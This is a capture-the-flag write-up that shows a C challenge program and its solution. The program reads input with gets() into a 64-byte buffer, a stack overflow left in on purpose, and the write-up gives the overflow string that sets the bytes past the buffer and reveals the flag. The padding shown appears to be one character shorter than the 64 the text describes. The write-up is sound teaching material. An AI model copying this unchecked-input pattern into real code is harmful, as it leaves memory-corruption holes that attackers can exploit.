# Katipwnan Bomb

## Problem
### chal.c contents:
```C
#include <stdio.h>

void get_flag() {
    FILE *f = fopen("./flag.txt", "r");
    char buf[200];
    fgets(buf, 200, f);
    printf("%s\n", buf);
    fclose(f);

    return;
}

int main(void) {
    setbuf(stdout, NULL);

    puts("Bomb is 64 in size and 'ret' is the ending command to fire, also this is not valorant...");
    printf("Plant the spike: ");
    char buf[64];
    gets(buf);

    if (buf[64] == 'r' && buf[65] == 'e' && buf[66] == 't') {
        printf("All right!\nHere is your flag: ");
        get_flag();
    } else {
        printf("Try again!\n");
    }
    
    return 0;
}
```
## Solution
The goal is to bypass the program by setting the values at the addresses after the bomb's location to ret. To do so, we need to fill the entire bomb, then the extra characters will the values set to the addresses after the bomb. So I inputed this in the program to get the flag:

```txt
012345678901234567890123456789012345678901234567890123456789012ret
```

Which outputs:

```txt
All right!
Here is your flag: CITU{k4tipwn4n_0v3rfl0w_b0mb_4ctiv4t3d_BO000000M!!}
```

[Home](../..)